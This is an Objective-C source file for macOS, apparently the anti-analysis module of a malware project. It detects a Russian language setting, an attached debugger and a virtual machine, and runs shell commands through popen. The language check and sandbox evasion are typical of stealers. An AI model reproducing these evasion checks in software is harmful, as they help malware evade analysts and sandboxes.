#ifdef DEBUG
#define DebugLog(...) NSLog(__VA_ARGS__)
#else
#define DebugLog(...) (void)0
#endif


#import "AntiVM.h"
#import <CoreFoundation/CoreFoundation.h>
#import <sys/sysctl.h>
#import <unistd.h>

@implementation AntiVM

+ (BOOL)isRussianLanguageInstalled {
    CFArrayRef preferredLanguages = CFLocaleCopyPreferredLanguages();
    CFIndex count = CFArrayGetCount(preferredLanguages);
    
    for (CFIndex i = 0; i < count; ++i) {
        CFStringRef language = (CFStringRef)CFArrayGetValueAtIndex(preferredLanguages, i);
        const char *cLanguage = CFStringGetCStringPtr(language, kCFStringEncodingUTF8);
        if (cLanguage && [[NSString stringWithUTF8String:cLanguage] containsString:@"ru"]) {
            CFRelease(preferredLanguages);
            return YES;
        }
    }
    CFRelease(preferredLanguages);
    return NO;
}

+ (BOOL)isDebuggerAttached {
    int mib[4];
    struct kinfo_proc info;
    size_t size = sizeof(info);

    info.kp_proc.p_flag = 0;

    mib[0] = CTL_KERN;
    mib[1] = KERN_PROC;
    mib[2] = KERN_PROC_PID;
    mib[3] = getpid();

    if (sysctl(mib, 4, &info, &size, NULL, 0) != 0) {
        return NO;
    }

    return (info.kp_proc.p_flag & P_TRACED) != 0;
}

+ (BOOL)checkVM {
    NSString *result = [self runCommand:@"system_profiler SPHardwareDataType | grep 'Model Identifier'"];
    return [result containsString:@"Virtual"];
}

+ (NSString *)runCommand:(NSString *)command {
    char buffer[128];
    NSString *result = @"";
    FILE *pipe = popen([command UTF8String], "r");
    if (!pipe) {
        return nil;
    }
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result = [result stringByAppendingString:[NSString stringWithUTF8String:buffer]];
    }
    pclose(pipe);
    return result;
}

@end
